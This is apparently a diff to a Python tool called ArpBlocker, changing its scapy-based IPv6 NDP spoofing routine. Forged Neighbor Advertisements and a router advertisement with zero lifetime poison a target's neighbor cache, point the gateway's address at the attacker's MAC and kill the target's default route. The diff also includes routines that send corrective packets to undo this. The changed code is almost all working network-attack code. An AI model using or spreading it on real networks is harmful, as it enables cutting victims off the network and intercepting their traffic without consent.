@@ -160,31 +160,32 @@ class ArpBlocker:
 
     def _ndp_spoof_loop(self):
         """Poison target's IPv6 neighbor cache: gateway's link-local -> our MAC."""
-        if not self.gateway_ll_addr or not self.target_ll_addr:
-            logger.warning("Missing IPv6 addresses — IPv6 NDP spoofing inactive")
+        if not self.gateway_ll_addr:
+            logger.warning("No gateway IPv6 link-local — IPv6 NDP spoofing inactive")
             return
 
         # Fake Neighbor Advertisement: "gateway's link-local is at OUR MAC"
-        # Sent directly to target's link-local so only it is poisoned
-        # R=1 (router), S=1 (solicited), O=1 (override) to force cache update
+        # Sent to ff02::1 (all-nodes multicast) — every host listens on it.
+        # Unicast to target MAC at L2 so only it receives the frame.
+        # R=1 (router), S=0 (unsolicited), O=1 (override) to force cache update.
         na_pkt = (
             Ether(dst=self.target_mac, src=self.our_mac)
-            / IPv6(src=self.gateway_ll_addr, dst=self.target_ll_addr)
-            / ICMPv6ND_NA(tgt=self.gateway_ll_addr, R=1, S=1, O=1)
+            / IPv6(src=self.gateway_ll_addr, dst="ff02::1")
+            / ICMPv6ND_NA(tgt=self.gateway_ll_addr, R=1, S=0, O=1)
             / ICMPv6NDOptDstLLAddr(lladdr=self.our_mac)
         )
 
         # Also send spoofed RA with lifetime=0 to kill the default route
         ra_pkt = (
             Ether(dst=self.target_mac, src=self.our_mac)
-            / IPv6(src=self.gateway_ll_addr, dst=self.target_ll_addr)
+            / IPv6(src=self.gateway_ll_addr, dst="ff02::1")
             / ICMPv6ND_RA(routerlifetime=0)
             / ICMPv6NDOptSrcLLAddr(lladdr=self.our_mac)
         )
 
         logger.info(
-            "Starting NDP spoof loop (gateway_ll=%s -> our_mac=%s, target_ll=%s)",
-            self.gateway_ll_addr, self.our_mac, self.target_ll_addr,
+            "Starting NDP spoof loop (gateway_ll=%s -> our_mac=%s)",
+            self.gateway_ll_addr, self.our_mac,
         )
         while not self._stop_event.is_set():
             sendp(na_pkt, iface=self.interface, verbose=False)
@@ -193,17 +194,17 @@ class ArpBlocker:
 
     def _send_corrective_ndp(self, count: int = 5):
         """Restore correct gateway neighbor entry on the target."""
-        if not self.gateway_ll_addr or not self.target_ll_addr or not self.gateway_mac:
+        if not self.gateway_ll_addr or not self.gateway_mac:
             return
         # Correct NA: gateway's link-local -> gateway's real MAC
-        pkt = (
+        na_pkt = (
             Ether(dst=self.target_mac, src=self.gateway_mac)
-            / IPv6(src=self.gateway_ll_addr, dst=self.target_ll_addr)
-            / ICMPv6ND_NA(tgt=self.gateway_ll_addr, R=1, S=1, O=1)
+            / IPv6(src=self.gateway_ll_addr, dst="ff02::1")
+            / ICMPv6ND_NA(tgt=self.gateway_ll_addr, R=1, S=0, O=1)
             / ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac)
         )
         for _ in range(count):
-            sendp(pkt, iface=self.interface, verbose=False)
+            sendp(na_pkt, iface=self.interface, verbose=False)
         logger.info("Sent %d corrective NDP packets", count)
 
     def _send_corrective_arp(self, count: int = 5):
@@ -236,7 +237,7 @@ class ArpBlocker:
         self._stop_event.clear()
         self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
         self._spoof_thread.start()
-        if self.gateway_ll_addr and self.target_ll_addr:
+        if self.gateway_ll_addr:
             self._ndp_thread = threading.Thread(target=self._ndp_spoof_loop, daemon=True)
             self._ndp_thread.start()
         self._spoofing = True
